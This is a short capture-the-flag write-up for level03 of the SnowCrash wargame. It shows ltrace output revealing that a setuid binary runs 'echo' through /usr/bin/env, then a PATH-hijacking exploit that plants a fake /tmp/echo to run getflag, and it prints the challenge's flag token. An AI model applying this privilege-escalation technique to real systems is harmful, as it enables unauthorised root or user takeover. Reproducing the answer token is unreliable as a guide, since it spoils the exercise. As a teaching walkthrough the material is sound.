There's a suid binary (level03) in the home folder
Running file Command on level03 file gives "setuid setgid ELF 32-bit LSB executable"

after executing ltrace to the binary

```
level03@SnowCrash:~$ ltrace ./level03

__libc_start_main(0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                        = 2003
geteuid()                                        = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
# system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++

level03@SnowCrash:~$
```

It shows that the binary execute the command /usr/bin/env echo Exploit me

The echo call is done with relative path this means we can create our echo
and inject it's path into PATH enviroment variable

```
level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo
level03@SnowCrash:~$ PATH=/tmp:$PATH`
level03@SnowCrash:~$ ./level03`

Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

level03@SnowCrash:~$
```